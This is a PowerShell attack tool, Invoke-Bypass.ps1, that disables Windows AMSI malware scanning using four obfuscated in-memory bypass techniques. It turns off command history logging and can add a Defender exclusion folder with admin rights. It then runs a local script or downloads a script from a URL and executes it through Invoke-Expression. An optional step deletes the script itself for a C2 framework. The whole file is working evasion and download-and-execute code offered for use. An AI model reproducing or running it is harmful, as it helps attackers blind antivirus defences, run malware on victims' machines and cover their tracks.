<#
.SYNOPSIS
   Disable AMS1 within current process.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Assembly {native}
   Optional Dependencies: IWR {native}
   PS cmdlet Dev version: v1.1.12

.DESCRIPTION
   This cmdlet attempts to disable AMS1 string scanning within
   the current process context (terminal console) It also allow is
   users to execute any inputed script trough AMS1 bypass technic.

.NOTES
   These techniques only disable AMS1 within current process.
   Remark: It does not exec cmdlets that requires 'Import-Module'
   Remark: Adding AV exclusion path requires administrator privs.

.Parameter List
   List cmdlet AMS1 bypass technics (default: false)

.Parameter Technic
   The AMS1 bypass technic to use (default: 2)

.Parameter Filepath
   Execute input script trough bypass? (default: false)

.Parameter FileArgs
   The script to be executed arguments (default: false)

.Parameter PayloadURL
   The script to be downloaded\executed! (default: false)

.Parameter ExcludeLocation
   The folder to exclude from defender scans (default: false)

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -list "technic"
   List cmdlet AMS1 bypass technics available 

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "1"
   Bypass ams1 detection on current proccess

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "evil.ps1"
   Bypass ams1 detection on current proccess and execute evil.ps1

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "3" -filepath "evil.ps1" -fileargs "-action 'true'"
   Bypass ams1 detection on current proccess and execute evil.ps1 with arguments (parameters)

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "4" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
   Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )

.EXAMPLE
   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "$Env:TMP\evil.ps1" -ExcludeLocation "$Env:TMP"
   Bypass ams1 detection on current proccess, execute evil.ps1 and add 'TMP' dir to AV exclusion path.

.INPUTS
   None. You cannot pipe objects into Invoke-Bypass.ps1

.OUTPUTS
   * Disable AMS1 within current process.
     + Executing AMS1 bypass technic [1]..

   Technic     : 1
   Bypass      : success
   Disclosure  : @mattifestation
   Description : FORCE_AM`SI_ERROR
   POC         : Auto-Execute: evil.ps1
   Report      : string detection DISABLED on console!
   Executing   : evil.ps1
   
.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/bypass/Invoke-Bypass.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ExcludeLocation="false",
   [string]$PayloadURL="false",
   [string]$Filepath="false",
   [string]$FileArgs="false",
   [string]$List="false",
   [string]$Egg="false",
   [int]$Technic='2'
)


$cmdletVersion = "v1.1.12"
#Cmdlet Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@Invoke-Bypass $cmdletVersion"
Write-Host "`n* Disable AM`S`1 within current process." -ForegroundColor Green

If($Technic -lt 1 -or $Technic -gt 4)
{
   [int]$Technic = 2
   write-host "  + " -ForegroundColor DarkYellow -NoNewline;
   write-host "wrong technic input, default to '$Technic'" -ForegroundColor red -BackgroundColor Black   
}

If($Filepath -ne "false")
{
   If($Filepath -iNotMatch '(.ps1|.bat|.vbs)$')
   {
      write-host "* Error:" -ForegroundColor Red -NoNewline;
      write-host "Invoke-Bypass accepts .ps1,.bat,.vbs formats" -ForegroundColor DarkGray
      exit #Exit @Invoke-Bypass
   }
}

If($List -iMatch "^(technic|technics)$")
{
   write-host "  +" -ForegroundColor DarkYellow -NoNewline;
   write-host " Listing A`MS`1 bypasses available .." -ForegroundColor DarkGray
   write-host "`n  Technic  Description" -ForegroundColor DarkYellow
   write-host "  -------  -----------"
   write-host "  1        PS`V2_DO`WNGR`ADE"
   write-host "  2        FORC`E_AM`SI_ERROR"
   write-host "  3        AM`SI_UT`ILS_P`AT`CH"
   write-host "  4        AM`SI_UT`ILS_BAS`E64"
   write-host ""
   write-host "* " -ForegroundColor Green -NoNewline;
   write-host "Syntax examples:" -ForegroundColor DarkGray
   write-host "  .\Invoke-Bypass.ps1 -technic '1'"
   write-host "  .\Invoke-Bypass.ps1 -technic '2' -filepath 'evil.ps1'"
   write-host "  .\Invoke-Bypass.ps1 -filepath 'evil.ps1' -ExcludeLocation `"`$Env:TMP`""
   write-host ""
   exit
}


write-host "*" -ForegroundColor Green -NoNewline;
$IoStream = "In@v" + "ok@e-M+m+" + "k@atz" -join ''
$Forbiden = $IoStream.Replace("@","").Replace("+","i")
write-host " Executing A`MS`1 bypass technic [" -ForegroundColor DarkGray -NoNewline;
write-host "$Technic" -ForegroundColor DarkYellow -NoNewline;
write-host "] .." -ForegroundColor DarkGray
Start-Sleep -Milliseconds 500

If($ExcludeLocation -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Exclude directory from defender scans!
   
   .NOTES
      Adding AV exclusion paths requires administrator privs.
      This setting excludes dirs from real-time\schedule scans.
   #>

   $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If($bool)
   {
      $MarchalCarmona = "Set-Mp@Pr"+"efe@ren@ce -Ex@cl@u"+"sio@nPa"+"@th $ExcludeLocation -force" -replace '@',''
      $MakeSure = $ExcludeLocation.Split('\')[-1]
      "$MarchalCarmona"|&('@ex' -replace '@','I')

      If((Get-MpPreference).ExclusionPath -iMatch "($MakeSure)$")
      {
         write-host "  + " -ForegroundColor DarkYellow -NoNewline;
         write-host "AV Exclu`sion Path: '" -ForegroundColor DarkGray -NoNewline; 
         write-host "$ExcludeLocation" -ForegroundColor DarkYellow -NoNewline;
         write-host "'" -ForegroundColor DarkGray;
      }
      Else
      {
         write-host "  + ExcludeLoc`ation: fail to add exclusion path .." -ForegroundColor Red -BackgroundColor Black;                                           
      }
   }
   Else
   {
      write-host "  + ExcludeLoca`tion: Administrator privs required .." -ForegroundColor Red -BackgroundColor Black;     
   }
}


If($Technic -eq 1)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @nullbyte
      Helper - PS`V2_DO`WNGR`ADE!
   #>

   $Disclosure = "@nullbyte"
   $TechnicName = "PS`V2_DO`WNGR`ADE"

   #Retrieve NET Framework version
   $NETversions = (Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -recurse|Get-ItemProperty -name Version -EA 0|Where-Object{$_.PSChildName -match '^(?!S)\p{L}'}).Version
   If($NETversions -Match "2.0.50727")
   {

      write-host "`n`n  Technic     : $Technic"
      write-host "  Bypass      : Success" -ForegroundColor Green
      write-host "  Disclosure  : $Disclosure"
      write-host "  Description : $TechnicName"

      If($FilePath -ne "false")
      {
         If($FilePath -Match '\\')
         {
            $FilePath = $FilePath.Split('\')[-1]    # evil.ps1
         }

         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
         write-host "  Report      : String detection DISABLED on console!"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
         write-host "$FilePath`n" -ForegroundColor Green

         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
         "$DownGradedPSesion"|&('{0}ex' -F'I')
      }
      ElseIf($PayloadUrl -ne "false")
      {
         $FilePath = $PayloadURL.Split('/')[-1]   # evil.ps1   
         write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
         write-host "  Report      : String detection DISABLED on console!"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
         write-host "$FilePath`n" -ForegroundColor Green

         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
         "$DownGradedPSesion"|&('{0}ex' -F'I')
      }
      Else
      {
         $returnversion = (Get-Host).Version.Major
         write-host "  POC         : Execute: $Forbiden" -ForegroundColor DarkYellow
         write-host "  Report      : String detection DISABLED on console!"
         write-host "  Remark      : Exec 'exit' to return to PS version ${returnversion}"
         write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline;
         write-host "powersh`ell -`ve`rsio`n 2`n" -ForegroundColor Green;

         $DownGradedPSesion = "po@we"+"rsh@el@l -@ver"+"si@on @2 -f@i"+" l@e $FilePath" -replace '@',''
         "$DownGradedPSesion"|&('{0}ex' -F'I')
      }
   }
   Else
   {
      write-host "`n`n  Technic     : $Technic"
      write-host "  Bypass      : Fail" -ForegroundColor DarkRed
      write-host "  Disclosure  : $Disclosure"
      write-host "  Description : $TechnicName"
      write-host "  POC         : Execute: $FilePath" -ForegroundColor DarkYellow
      write-host "  Report      : " -NoNewline;
      write-host ".Net version 2.0.50727 not found. Can't start PowerShell V2`n`n" -ForegroundColor DarkRed
   }

exit
}
ElseIf($Technic -eq 2)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @mattifestation
      Helper - FORC`E_AM`SI_ERROR!
   #>

   $Disclosure = "@mattifestation"
   $TechnicName = "FORCE_AM`SI_ERROR"

   Try{#Ams1 bypass technic n� 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.M£n£g' + 'e@+nt.Auto@' + '£tion.A' -join ''
      $fdx = '@ms' + '£In£' + 'tF@£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,[bool]0x12AE)
   }Catch{Throw $_}
}
ElseIf($Technic -eq 3)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @mattifestation
      Helper - AM`SI_UT`ILS_P`AT`CH!
   #>

   $Disclosure = "@mattifestation"
   $TechnicName = "AM`SI_UT`ILS_P`AT`CH"

   Try{#Ams1 bypass technic n� 3
      $MsTeamsId = "4456625220575263174452554847"
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $Drawing = "Sy@ste+.M@ana"+"ge+e@nt" + ".Auto@+ati@on."+"A+s@i" + "U@ti@ls" -Join ''
      $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
      $imgForm = $Drawing.Replace("@","").Replace("+","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
      $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,[bool]0x12AE)
   }Catch{Throw $_}
}
ElseIf($Technic -eq 4)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Disclosure: @Unknown
      Helper - AM`SI_UT`ILS_BAS`E64
   #>

   $Disclosure = "@Unknown"
   $TechnicName = "AM`SI_UT`ILS_BAS`E64"

   Try{#Ams1 bypass technic n 4
      $KernelID = "No@nP" + "@ub@lic" -replace '@',''
      [Ref].Assembly.GetType($('Syst'+'em.Manag'+'ement.Autom'+'ation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+
      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA='))+
      $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA='))))+
      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$("$KernelID,Static")).SetValue($null,[bool]0x12AE)
   }Catch{Throw $_}
}



If($?)
{
   ## String_POC_Obfuscation
   $FileName = $Filepath.Split('\')[-1]
   $CmdletNa = $PayloadURL.Split('/')[-1]

   If($Filepath -ne "false")
   {
      $POC = "Auto-Execute: $FileName"
      $ttl = "$FileName"
   }
   ElseIf($Filepath -ieq "false" -and $PayloadURL -ieq "false")
   {
      $POC = "Manual-Execute: $Forbiden"
      $ttl = "$Forbiden"
   }
   ElseIf($PayloadURL -ne "false")
   {
      $POC = "Download-Execute: $CmdletNa" 
      $ttl = "$CmdletNa"
   }

   ## Check current console AM`S1 state
   $FacebookID = "4456625220575263174452554847"
   $ComponentId = "N`onP" + "ubl`ic" -join ''
   $Drawing = "Sy@ste+.M@ana"+"ge+e@nt" + ".Auto@+ati@on."+"A+s@i" + "U@ti@ls" -Join ''
   $Graphics = [string](0..13|%{[char][int](53+($FacebookID).substring(($_*2),2))}) -Replace ' '
   $WindowSize = $Drawing.Replace("@","").Replace("+","m");$Bitmap = [Ref].Assembly.GetType($WindowSize)
   
   If($([bool](([Ref].Assembly.GetType($WindowSize).GetField($Graphics,"$ComponentId,Static").GetValue($null)))))
   {
      $BypassState = "Success"
      $AmsiState = "String detection DISABLE on console!"
   }
   Else
   {
      $BypassState = "Fail?"   
      $AmsiState = "String detection ENABLE on console!"
   }


   write-host "`n`n  Technic     : $Technic"
   write-host "  Bypass      : " -NoNewline
   If($BypassState -Match '^(Success)$')
   {
      write-host "$BypassState" -ForegroundColor Green
   }
   Else
   {
      write-host "$BypassState" -ForegroundColor Red   
   }
   write-host "  Disclosure  : $Disclosure"
   write-host "  Description : $TechnicName"
   write-host "  POC         : $POC"
   write-host "  Report      : " -NoNewline
   If($BypassState -Match '^(Success)$')
   {
      write-host "$AmsiState" -ForegroundColor Green
   }
   Else
   {
      write-host "$AmsiState" -ForegroundColor Red   
   }
   If($Filepath -ne "false")
   {
      write-host "  Executing   : " -ForegroundColor DarkGray -NoNewline
      write-host "$ttl`n" -ForegroundColor Green
   }

}
Else
{
   Write-Host "* Error: executing technic '$Technic' bypass!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "`n";exit
}


Start-Sleep -Seconds 1
If($Filepath -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute inputed cmdlet

   .NOTES
      This function exec cmdlets with or without arguments.
      Remark: It does not exec cmdlets that requires 'Import-Module'
   #>

   $Filepath = ".\" + "$Filepath" -join ''

   If($FileArgs -ne "false")
   {
      &('{0}ex' -F'I') "$Filepath $FileArgs"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath $FileArgs" #Import-Module function
   }
   Else
   {
      &('{0}ex' -F'I') "$Filepath"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath"           #Import-Module function
   }
}


If($PayloadURL -ne "false")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download\Execute cmdlet trough AMS1_bypass!

   .NOTES
      It does not exec cmdlets that requires 'Import-Module'
   #>

   #Parse URL data
   $FilePath = $PayloadURL.Split('/')[-1]   # evil.ps1
   $DomainName = $PayloadURL.Split('/')[2]  # github

   If($PayloadURL -iNotMatch '^[http(s)://]')
   {
      #Wrong download fileformat syntax user input
      Write-Host "* Error: -payloadURL '<url>' requires http(s) format!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @Invoke-Bypass    
   }
   
   If($PayloadURL -iNotMatch '(.ps1|.psm1|.psd1)$')
   {
      #Wrong download fileformat syntax user input
      Write-Host "* Error: -payloadURL '<url>' accepts .ps1,.psm1,.psd1 formats!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 2;exit ## @Invoke-Bypass    
   }

   If($PayloadURL -iMatch '^(https://)')
   {
      $PortNumber = "445"
   }
   ElseIf($PayloadURL -iMatch '^(http://)')
   {
      $PortNumber = "80"
   }

   #Build Table display
   Write-Host "`n`n* Download\Execute '$Filepath'" -ForegroundColor Green
   Write-Host "+ " -ForegroundColor DarkYellow -NoNewline;
   Write-Host "[connecting to] $DomainName TCP $PortNumber .." -ForegroundColor DarkGray
   Write-Host "     uri: " -ForegroundColor DarkGray -NoNewline;
   Write-Host "$PayloadURL`n" -ForegroundColor DarkYellow 

   #Download cmdlet
   iwr -uri "$PayloadURL" -OutFile "$FilePath"|Unblock-File
   $Filepath = ".\" + "$Filepath" -join ''

   If($FileArgs -ne "false")
   {
      &('{0}ex' -F'I') "$Filepath $FileArgs"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath $FileArgs" #Import-Module function
   }
   Else
   {
      &('{0}ex' -F'I') "$Filepath"
      #$Filepath = "$Filepath" -replace '.\\','' -replace '.ps1',''  #Import-Module function
      #Import-Module -Name .\$Filepath -Force;&"$Filepath"           #Import-Module function
   }
                       
}

write-host "`n"
If($Egg -ieq "True")
{
   #Auto-Delete this cmdlet (@Meterpeter C2 internal function)
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}